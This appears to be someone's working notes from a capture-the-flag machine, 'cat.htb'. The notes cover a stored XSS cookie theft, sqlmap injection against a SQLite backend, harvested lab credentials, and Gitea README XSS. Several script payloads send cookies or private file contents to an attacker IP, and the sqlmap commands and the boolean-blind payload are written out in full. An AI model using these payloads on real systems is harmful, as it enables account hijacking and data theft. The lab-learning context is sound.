probs need to login as an admin user or something like that 
any cookies?
look at the page source code
ffuf doesn't seem to reveal any subdomains / virtual hosts
ok what is the attack surface?
-> i can go after the cat login site 
-> there is an admin.php and config.php page
we might only be able to get information from config.php after logging in as an admin?
we can upload a photo but not sure what that does for us 
is there a way to view the image maybe

there is a /img folder
going to small.jpg says the error below 

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at cat.htb Port 80</address>
</body></html>


yea not sure what the attack surface is here in terms of file upload
- [ ] look at some 0xdf blog posts talking about stuff like jpg file upload attacks 

.git repo found
sql injection maybe 
accept_cat.php insert statement does not use prepare so it is probably vulnerable to an injection
maybe we can use sqlmap instead of doing manually 
accept_cat only called in admin.php file?
so maybe that's a second step not a first step 

axel is the admin username
can i make an account as axel lol 
ok, the thing i am missing right now is axel's password
the idea is
1) login as admin after getting axel's password 
2) sqlmap attack on the non-prepared sql statement to dumb the database
3) crack md5 hashes 


how to get axels' password? is there anything vulnerable with the session id? 
triple equal vs double equal in php?
https://stackoverflow.com/questions/80646/how-do-the-php-equality-double-equals-and-identity-triple-equals-comp
seems like double equal will pass the equality for 0's?'
maybe 0 doesnt matter

axel only:
- delete_cat.php
- accept_cat.php 
- admin.php
- view_cat.php
- vote.php (useless maybe)
- winners.php (useless maybe)

regular users: 
- config.php
- contest.php
- index.php
- join.php
- logout.php


the goal is to steal the PHPSESSIONID now 
but how to do that? we need to exploit an xss vulnerability; how do we know one is there in the username creation step? how do we know that axel will click on the link even?
okay, i guess this is a stored xss attack then 
since we save the <script>document.cookie </script> string inside the database
then when does it get retrieved by axel
the username should be rendered in one of the files in order for the xss to happen
view_cat.php and join.php both have username rendered i think 


okay, so the attack vector is: 
- [x] stored xss attack within username
    <script> let img = new Image(); img.src="http://10.10.14.8:8000/?=document.cookie""</script>
    something like this 
- [x] use the PHPSESSID to become admin
- [ ] run sqlmap on the accept_cat file for the parameter cat_name with the command:
    sqlmap -r sql_req.txt cat_name --risk 3 --level 5
    something like that
- [ ] try to dumb database for axel's password 


<script>let img = new Image(); img.src="http://10.10.14.8:8000/?c="+encodeURIComponent(document.cookie);</script>
4n6pjva97qnfj6b30604ebmjij


sqlmap -r sql-req.txt -p "cat_name" --batch --level=5 --risk=3

---
Parameter: catName (POST)
    Type: boolean-based blind
    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
    Payload: catName=asdf' AND CASE WHEN 7651=7651 THEN 7651 ELSE JSON(CHAR(101,72,88,101)) END AND
 'TNAP'='TNAP&catId=1
-

this was able to dump the database but why
sqlmap -r sql-req.txt -p catName --dbms sqlite --level 5 --risk 3 --technique=B -T users --dump

i need to dump a specific tablle and from the source code we can see a table called users
the query in view_cat.php indicates that there is indeed a table called users


rosa
soyunaprincesarosa
not sure how it would work for axel; might have to change their password or something?
ideas to test:
- [x] check for all users with the name rosa / groups that rosa belongs to 
- [x] look for stuff in /opt to see if there are extra packages maybe
    <-- there are none
- [ ] check for other running services on the box
    <-- seems like there is a service at 127.0.1.1, on port 80 but this just might be the web service itself
- [ ] check for specific network connections as well 
port 25 is talking to something?
how to ssh tunnel and talk to port 25?
how is this related to gittea? how did the other people know gittea was even running as a service? how did they find out about this wtf 
ok we need to look at credentials in the apache logs
found in apache2/access.log 

axel 
aNdZwgC4tI9gnVXv_e3Q

78087ea7900d52dee379fe8b0d5d6449

from netstat we can see that gittea is being hosted on port 3000 even through ps aux doesnt show it 
but there is no information on gittea even though it feels like a piece of the puzzle
where to go from here?
we know it's related to mail / snmp because port 25 is open
and i remember there being another xss vulnerability somewhere but not sure where
- [ ] look for jobert's email?
    <-- administrator@cat.htb?
    <-- jobert2020@gmail.com
        <-- probably not this one just because it's a gmail account

snmp does not appear to be running, so what is on port 25?
smtp (not snmp), which is running and we can check that with telnet
so now how do we interact with telnet?
yea i have no idea what the attack vector is for this
mail enumeration???
this feels so contrived
need to do more enumeration to know what the intended attack vector is
in the logs, there are instructions detailing how to craft a repo / email?
/var/mail directory has something

- [ ] send email to jobert@localhost with info about gitea repository 
<-- what information are we trying to exfiltrate from jobert in this situation?
<-- some repo called http://localhost:3000/administrator/Employee-management/
<-- http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md
    there is some README file 

    we need to create a phishing link that looks like this, but is redirected to our website
    but what we need is a password
    is there a way to get a shell from this?

idea: hijack session id and then is there a way to get a password?
can i do a reverse shell using xss?
would be hard just from them clicking a link i think 
link click to reverse shell? is this possible?
click the link, but then what?

1. swaks to generate a fake email
2. the email contains a link to our fake repo???
3. or would it be a link to localhost:3000 or something

the info is in /var/mail i guess
Not exactly what is shown above; instead we should create a repo and it should have an xss payload, but not sure what sort of data / cookies we are stealing?
ok so the administrator / Employee-management site is a private url 
1. create a repo with a README.md file containing xss code
    <-- what should this even look like 
2. embed javascript inside the README file s.t. it fetches and relays information from http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md
    <-- even though i should be able to visit this page, it seems i am unable to 
3. this should in theory contain credentials 


something like this
<a href="javascript:(async () => { 
  await fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/README.md')
    .then(result => result.text())
    .then(data => { 
      let img = new Image(); 
      img.src = 'http://10.10.14.181/?c=' + encodeURIComponent(data);
    })
    .catch(err => console.error(err));
})()">Click Here</a>

the site gets deleted very quickly so best to automate instead
- [ ] post request: /repo/create 
- [ ] post request: /axel/<rep name>/_new/main/ afterwards
POST /axel/abv/_new/main/

the script isn't working and i'm not sure why; i wish i could render the web page to see what is going wrong tbh 
ok, this is hard to debug i'm going to try instead to do it manually i guess


<a href="javascript:fetch('http://localhost:3000/administrator/Employee-management/raw/branch/main/index.php').then(response => response.text()).then(data => fetch('http://10.10.14.181/?response=' + encodeURIComponent(data))).catch(error => console.error('Error:', error));">abc</a>


GET/?response=<?php
$valid_username = 'admin';
$valid_password = 'IKw75eR0MR7CMIxhH0';

if (!isset($_SERVER['PHP_AUTH_USER']) || !isset($_SERVER['PHP_AUTH_PW']) || 
    $_SERVER['PHP_AUTH_USER'] != $valid_username || $_SERVER['PHP_AUTH_PW'] != $valid_password) {
    
    header('WWW-Authenticate: Basic realm="Employee Management"');
    header('HTTP/1.0 401 Unauthorized');
    exit;
}

header('Location: dashboard.php');
exit;
?>

HTTP/1.1"200-
